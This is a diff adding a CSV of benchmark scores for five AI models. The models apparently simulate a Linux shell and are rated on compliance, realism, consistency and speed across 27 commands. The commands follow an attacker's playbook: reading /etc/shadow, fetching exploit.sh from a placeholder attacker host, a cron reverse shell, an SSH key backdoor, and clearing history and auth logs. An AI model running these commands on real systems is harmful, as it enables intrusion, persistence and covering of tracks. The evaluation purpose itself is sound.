@@ -1,0 +1,136 @@
+Model,Command_Num,Command,Compliance,Realism,Consistency,Speed,Overall,Response_Time
+deepseek,1,"uname -a",10,7,9,3,7.65,20.37
+deepseek,2,"whoami",10,7,8,5,7.85,11.27
+deepseek,3,"id",10,7,7,7,8.05,9.65
+deepseek,4,"cat /etc/passwd",10,7,7,2,7.05,58.84
+deepseek,5,"cat /etc/shadow",10,8,7,2,7.30,46.99
+deepseek,6,"cat /etc/os-release",10,7,7,2,7.05,30.33
+deepseek,7,"ps aux",10,7,7,1,6.85,96.74
+deepseek,8,"netstat -antup",10,8,7,3,7.50,27.85
+deepseek,9,"ss -antup",10,7,7,1,6.85,67.72
+deepseek,10,"ifconfig",10,8,7,2,7.30,39.55
+deepseek,11,"ip a",10,8,7,3,7.50,29.18
+deepseek,12,"sudo -l",10,7,7,3,7.25,21.25
+deepseek,13,"history",10,8,7,5,7.90,17.96
+deepseek,14,"find / -perm -u=s -type f 2>/dev/null",10,7,7,5,7.65,18.54
+deepseek,15,"sudo su",10,7,7,3,7.25,20.75
+deepseek,16,"wget http://<attacker-ip>/exploit.sh",10,10,7,3,8.00,20.0
+deepseek,17,"curl -o exploit.sh http://<attacker-ip>/exploit.sh",10,8,7,2,7.30,58.03
+deepseek,18,"chmod +x exploit.sh",10,7,8,3,7.45,20.9
+deepseek,19,"./exploit.sh",10,9,7,3,7.75,22.51
+deepseek,20,"crontab -l",10,7,7,2,7.05,56.67
+deepseek,21,"echo '0 * * * * /bin/bash -c ""bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1""' | crontab -",10,7,7,3,7.25,25.69
+deepseek,22,"echo ""ssh-rsa AAAA..."" >> ~/.ssh/authorized_keys",10,7,8,2,7.25,43.32
+deepseek,23,"ssh user@<internal-ip>",10,5,7,1,6.35,75.78
+deepseek,24,"history -c",10,7,8,3,7.45,26.23
+deepseek,25,"unset HISTFILE",10,7,8,5,7.85,15.03
+deepseek,26,"rm -f /var/log/auth.log",10,7,8,3,7.45,21.61
+deepseek,27,"cat /dev/null > /var/log/wtmp",10,7,8,2,7.25,36.37
+gemini,1,"uname -a",10,7,9,9,8.85,2.71
+gemini,2,"whoami",10,7,8,10,8.85,1.46
+gemini,3,"id",10,7,7,9,8.45,4.39
+gemini,4,"cat /etc/passwd",10,7,7,5,7.65,18.69
+gemini,5,"cat /etc/shadow",10,8,7,5,7.90,15.32
+gemini,6,"cat /etc/os-release",10,7,7,7,8.05,9.42
+gemini,7,"ps aux",10,7,7,3,7.25,23.59
+gemini,8,"netstat -antup",10,8,7,3,7.50,20.03
+gemini,9,"ss -antup",10,7,7,7,8.05,6.31
+gemini,10,"ifconfig",10,7,7,7,8.05,6.38
+gemini,11,"ip a",10,8,7,5,7.90,16.68
+gemini,12,"sudo -l",10,7,7,7,8.05,6.16
+gemini,13,"history",10,8,7,9,8.70,4.54
+gemini,14,"find / -perm -u=s -type f 2>/dev/null",10,7,7,5,7.65,11.33
+gemini,15,"sudo su",10,7,8,7,8.25,5.57
+gemini,16,"wget http://<attacker-ip>/exploit.sh",10,10,7,5,8.40,16.67
+gemini,17,"curl -o exploit.sh http://<attacker-ip>/exploit.sh",10,8,7,5,7.90,15.03
+gemini,18,"chmod +x exploit.sh",10,7,8,10,8.85,1.51
+gemini,19,"./exploit.sh",10,9,7,7,8.55,5.55
+gemini,20,"crontab -l",10,7,7,10,8.65,1.98
+gemini,21,"echo '0 * * * * /bin/bash -c ""bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1""' | crontab -",10,7,8,9,8.65,3.0
+gemini,22,"echo ""ssh-rsa AAAA..."" >> ~/.ssh/authorized_keys",10,7,8,7,8.25,8.64
+gemini,23,"ssh user@<internal-ip>",9,5,7,5,6.80,12.86
+gemini,24,"history -c",10,7,8,9,8.65,3.56
+gemini,25,"unset HISTFILE",10,7,8,9,8.65,3.23
+gemini,26,"rm -f /var/log/auth.log",10,7,8,9,8.65,4.73
+gemini,27,"cat /dev/null > /var/log/wtmp",10,7,8,9,8.65,4.28
+gpt,1,"uname -a",10,7,9,7,8.45,7.89
+gpt,2,"whoami",10,7,8,7,8.25,6.45
+gpt,3,"id",10,7,7,7,8.05,5.9
+gpt,4,"cat /etc/passwd",10,7,7,3,7.25,26.23
+gpt,5,"cat /etc/shadow",9,6,7,2,6.45,37.45
+gpt,6,"cat /etc/os-release",10,7,7,5,7.65,11.7
+gpt,7,"ps aux",10,7,7,1,6.85,65.02
+gpt,8,"netstat -antup",10,8,7,2,7.30,54.85
+gpt,9,"ss -antup",10,7,7,2,7.05,34.86
+gpt,10,"ifconfig",10,8,7,3,7.50,28.55
+gpt,11,"ip a",10,8,7,2,7.30,33.98
+gpt,12,"sudo -l",10,7,7,5,7.65,19.14
+gpt,13,"history",10,8,7,5,7.90,18.64
+gpt,14,"find / -perm -u=s -type f 2>/dev/null",10,7,7,1,6.85,96.17
+gpt,15,"sudo su",10,7,8,5,7.85,13.71
+gpt,16,"wget http://<attacker-ip>/exploit.sh",10,9,7,3,7.75,29.33
+gpt,17,"curl -o exploit.sh http://<attacker-ip>/exploit.sh",10,9,7,3,7.75,25.6
+gpt,18,"chmod +x exploit.sh",10,10,7,5,8.40,10.77
+gpt,19,"./exploit.sh",10,9,7,7,8.55,9.79
+gpt,20,"crontab -l",10,7,7,5,7.65,14.47
+gpt,21,"echo '0 * * * * /bin/bash -c ""bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1""' | crontab -",10,9,7,3,7.75,23.78
+gpt,22,"echo ""ssh-rsa AAAA..."" >> ~/.ssh/authorized_keys",10,7,8,5,7.85,12.69
+gpt,23,"ssh user@<internal-ip>",10,8,7,2,7.30,30.5
+gpt,24,"history -c",10,7,8,7,8.25,5.28
+gpt,25,"unset HISTFILE",10,7,8,7,8.25,5.31
+gpt,26,"rm -f /var/log/auth.log",10,7,8,7,8.25,5.89
+gpt,27,"cat /dev/null > /var/log/wtmp",10,7,8,7,8.25,7.59
+llama,1,"uname -a",10,7,9,9,8.85,3.56
+llama,2,"whoami",10,7,8,10,8.85,0.97
+llama,3,"id",10,7,7,10,8.65,1.63
+llama,4,"cat /etc/passwd",10,7,7,2,7.05,31.05
+llama,5,"cat /etc/shadow",10,8,7,5,7.90,18.67
+llama,6,"cat /etc/os-release",10,7,7,7,8.05,6.64
+llama,7,"ps aux",10,7,7,5,7.65,13.17
+llama,8,"netstat -antup",10,8,7,5,7.90,18.2
+llama,9,"ss -antup",10,7,7,5,7.65,17.16
+llama,10,"ifconfig",10,8,7,5,7.90,17.72
+llama,11,"ip a",10,8,7,5,7.90,12.61
+llama,12,"sudo -l",10,7,7,9,8.45,4.64
+llama,13,"history",10,8,7,10,8.90,1.93
+llama,14,"find / -perm -u=s -type f 2>/dev/null",10,7,7,7,8.05,5.28
+llama,15,"sudo su",10,7,8,10,8.85,0.94
+llama,16,"wget http://<attacker-ip>/exploit.sh",10,9,7,7,8.55,6.65
+llama,17,"curl -o exploit.sh http://<attacker-ip>/exploit.sh",10,8,7,9,8.70,4.66
+llama,18,"chmod +x exploit.sh",10,7,8,10,8.85,0.99
+llama,19,"./exploit.sh",10,9,7,10,9.15,1.5
+llama,20,"crontab -l",10,7,7,10,8.65,1.22
+llama,21,"echo '0 * * * * /bin/bash -c ""bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1""' | crontab -",10,7,8,10,8.85,1.17
+llama,22,"echo ""ssh-rsa AAAA..."" >> ~/.ssh/authorized_keys",10,7,8,10,8.85,0.98
+llama,23,"ssh user@<internal-ip>",10,8,7,10,8.90,1.72
+llama,24,"history -c",10,7,8,10,8.85,0.98
+llama,25,"unset HISTFILE",10,7,8,10,8.85,0.94
+llama,26,"rm -f /var/log/auth.log",10,7,8,10,8.85,0.94
+llama,27,"cat /dev/null > /var/log/wtmp",10,7,8,10,8.85,0.95
+sonnet,1,"uname -a",10,7,9,9,8.85,3.89
+sonnet,2,"whoami",10,7,8,9,8.65,3.46
+sonnet,3,"id",10,7,7,9,8.45,3.85
+sonnet,4,"cat /etc/passwd",10,7,7,5,7.65,10.18
+sonnet,5,"cat /etc/shadow",10,8,7,5,7.90,13.19
+sonnet,6,"cat /etc/os-release",10,7,7,7,8.05,6.23
+sonnet,7,"ps aux",10,7,7,5,7.65,17.37
+sonnet,8,"netstat -antup",10,8,7,5,7.90,11.23
+sonnet,9,"ss -antup",10,7,7,5,7.65,10.78
+sonnet,10,"ifconfig",10,8,7,7,8.30,8.72
+sonnet,11,"ip a",10,8,7,7,8.30,7.86
+sonnet,12,"sudo -l",10,7,7,9,8.45,4.69
+sonnet,13,"history",10,8,7,7,8.30,6.83
+sonnet,14,"find / -perm -u=s -type f 2>/dev/null",10,7,7,7,8.05,7.16
+sonnet,15,"sudo su",10,7,8,7,8.25,5.11
+sonnet,16,"wget http://<attacker-ip>/exploit.sh",0,5,4,7,3.45,6.78
+sonnet,17,"curl -o exploit.sh http://<attacker-ip>/exploit.sh",10,8,7,7,8.30,9.92
+sonnet,18,"chmod +x exploit.sh",10,10,7,9,9.20,4.29
+sonnet,19,"./exploit.sh",10,9,7,7,8.55,5.05
+sonnet,20,"crontab -l",10,7,7,7,8.05,7.53
+sonnet,21,"echo '0 * * * * /bin/bash -c ""bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1""' | crontab -",10,7,8,7,8.25,7.48
+sonnet,22,"echo ""ssh-rsa AAAA..."" >> ~/.ssh/authorized_keys",10,7,8,9,8.65,4.12
+sonnet,23,"ssh user@<internal-ip>",10,8,7,7,8.30,5.02
+sonnet,24,"history -c",10,7,8,9,8.65,2.99
+sonnet,25,"unset HISTFILE",10,7,8,9,8.65,3.68
+sonnet,26,"rm -f /var/log/auth.log",10,7,8,9,8.65,4.76
+sonnet,27,"cat /dev/null > /var/log/wtmp",10,7,8,7,8.25,5.2
